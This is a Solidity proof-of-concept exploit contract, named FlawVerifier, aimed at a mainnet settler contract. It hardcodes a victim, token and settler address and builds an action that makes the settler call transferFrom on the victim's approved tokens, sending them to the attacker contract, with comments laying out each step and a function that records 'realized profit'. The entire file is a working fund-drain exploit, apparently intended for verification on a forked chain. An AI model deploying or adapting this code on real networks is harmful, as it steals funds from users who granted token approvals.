// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

struct AllowedSlippage {
    address payable recipient;
    IERC20Like buyToken;
    uint256 minAmountOut;
}

interface IMainnetSettler {
    function execute(AllowedSlippage calldata slippage, bytes[] calldata actions, bytes32 data)
        external
        payable
        returns (bool);
}

contract FlawVerifier {
    address internal constant MAINNET_SETTLER = 0xDf31A70a21A1931e02033dBBa7DEaCe6c45cfd0f;
    address internal constant PROFIT_TOKEN = 0x68BbEd6A47194EFf1CF514B50Ea91895597fc91E;
    address internal constant VICTIM = 0x382fFCe2287252F930E1C8DC9328dac5BF282bA1;

    bytes4 internal constant SETTLER_ACTION_SELECTOR = 0x38c9c147;
    bytes4 internal constant ERC20_TRANSFER_FROM_SELECTOR = 0x23b872dd;

    uint256 internal _realizedProfit;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 amount = previewAmount();
        require(amount != 0, "no approved victim balance at fork");

        // Exploit path alignment:
        // 1) Victim grants ERC-20 allowance to the settler.
        // 2) Attacker reads the victim's token balance.
        // 3) Attacker encodes an action whose outer call targets the token contract and whose
        //    inner calldata is transferFrom(victim, attacker, amount).
        // 4) Attacker submits the crafted bytes in actions to execute().
        // 5) The settler performs the token transfer using its spender approval, moving victim
        //    funds to the attacker.
        //
        // The verifier contract itself is the attacker/recipient so the stolen on-chain token
        // balance is directly attributable to this PoC. No synthetic funding or storage tricks
        // are used because the vulnerable authority already exists on-chain via the victim's
        // approval to the settler.
        AllowedSlippage memory slippage = AllowedSlippage({
            recipient: payable(address(0)),
            buyToken: IERC20Like(address(0)),
            minAmountOut: 0
        });

        bytes[] memory actions = new bytes[](1);
        actions[0] = _buildTransferFromAction(VICTIM, address(this), amount);

        uint256 balanceBefore = IERC20Like(PROFIT_TOKEN).balanceOf(address(this));
        bool ok = IMainnetSettler(MAINNET_SETTLER).execute(slippage, actions, bytes32(0));
        require(ok, "settler returned false");

        uint256 balanceAfter = IERC20Like(PROFIT_TOKEN).balanceOf(address(this));
        require(balanceAfter > balanceBefore, "no token profit realized");

        unchecked {
            _realizedProfit += balanceAfter - balanceBefore;
        }
    }

    function previewAmount() public view returns (uint256) {
        uint256 victimBalance = IERC20Like(PROFIT_TOKEN).balanceOf(VICTIM);
        uint256 approvedAmount = IERC20Like(PROFIT_TOKEN).allowance(VICTIM, MAINNET_SETTLER);
        return victimBalance < approvedAmount ? victimBalance : approvedAmount;
    }

    function profitToken() external pure returns (address) {
        return PROFIT_TOKEN;
    }

    function profitAmount() external view returns (uint256) {
        return _realizedProfit;
    }

    function _buildTransferFromAction(address from, address to, uint256 amount) internal pure returns (bytes memory) {
        bytes memory innerCalldata = abi.encodeWithSelector(ERC20_TRANSFER_FROM_SELECTOR, from, to, amount);
        return abi.encodeWithSelector(
            SETTLER_ACTION_SELECTOR,
            uint256(0),
            uint256(10_000),
            PROFIT_TOKEN,
            uint256(0),
            innerCalldata
        );
    }
}
